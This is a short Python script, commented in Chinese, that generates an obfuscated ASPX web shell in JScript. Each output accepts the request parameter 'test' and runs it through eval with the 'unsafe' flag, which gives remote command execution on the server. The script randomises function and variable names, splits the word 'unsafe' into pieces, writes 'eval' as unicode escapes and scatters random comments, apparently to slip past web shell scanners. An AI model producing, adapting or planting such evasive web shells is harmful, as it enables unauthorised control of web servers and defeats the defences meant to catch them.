import random
import string


# 随机生成注释
def random_comment():
    return f"/*{'TST' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=5))}*/"


# 随机生成分隔符
def random_separator():
    return "%><%"


# 随机生成变量名
def random_var_name(length=5):
    return ''.join(random.choices(string.ascii_letters, k=length))


# 随机生成函数名
def random_func_name(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# 拼接 ASPX 代码
def generate_aspx():
    # 随机生成函数名和变量名
    func_name = random_func_name()
    var_HSD = random_var_name()
    var_GEPH = random_var_name()
    var_YACK = random_var_name()
    var_CMQ3 = random_var_name()

    # 生成脚本
    aspx_script = []

    # 开头部分
    aspx_script.append(f"<%{random_comment()} function {func_name} {random_comment()}{random_separator()}%>")

    # 函数体部分
    aspx_script.append(f"<%{random_comment()}(){{%>")
    aspx_script.append(f"var {var_HSD} = 'un';{random_comment()}")
    aspx_script.append(f"var {var_GEPH} = 'sa';{random_comment()}")
    aspx_script.append(f"var {var_YACK} = 'fe';{random_comment()}")
    aspx_script.append(f"var {var_CMQ3} = {var_HSD} + {var_GEPH} + {var_YACK};")
    aspx_script.append(f"return {var_CMQ3};{random_comment()}")
    aspx_script.append(f"}}%>")

    # 变量定义和 eval 执行部分
    aspx_script.append(f"<%var PAY = String(Request['test']);%>")
    aspx_script.append(f"<%{random_separator()}%>")
    aspx_script.append(f"<%\u0065\u0076\u0061\u006c{random_comment()}%>")
    aspx_script.append(f"(PAY, {func_name}());")
    aspx_script.append(f"<%@ Page Language = 'JS' %>")

    # 返回生成的 ASPX 脚本
    return '\n'.join(aspx_script)


# 生成脚本
generated_script = generate_aspx()

# 打印生成的 ASPX 脚本
print(generated_script)
